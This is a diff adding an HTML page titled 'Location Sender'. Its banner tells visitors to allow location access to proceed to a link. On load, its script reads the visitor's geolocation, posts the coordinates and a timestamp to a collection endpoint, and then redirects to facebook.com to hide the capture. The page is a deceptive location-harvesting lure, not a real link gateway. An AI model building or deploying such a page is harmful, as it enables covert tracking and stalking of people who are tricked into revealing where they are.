@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Sender</title>
+  <style>
+    /* Internal CSS */
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #6b73ff, #000dff);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 2rem;
+      max-width: 600px;
+      line-height: 1.5;
+      padding: 20px;
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
+    }
+
+    /* Loading spinner animation */
+    .spinner {
+      margin-top: 30px;
+      width: 50px;
+      height: 50px;
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <h1>Allow location to proceed to the link</h1>
+    <div class="spinner"></div>
+  </div>
+
+  <script>
+    const redirectAfterSend = "https://www.facebook.com";
+
+    async function sendLocation() {
+      if (!navigator.geolocation) {
+        alert("Geolocation not supported");
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (position) => {
+        const data = {
+          lat: position.coords.latitude,
+          lng: position.coords.longitude,
+          timestamp: Date.now()
+        };
+
+        try {
+          await fetch('http://localhost:3000/api/location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data)
+          });
+
+          window.location.href = redirectAfterSend;
+
+        } catch (err) {
+          console.error("Error sending location:", err);
+        }
+      }, (err) => {
+        console.error("Geolocation error:", err);
+      });
+    }
+
+    sendLocation();
+  </script>
+</body>
+</html>
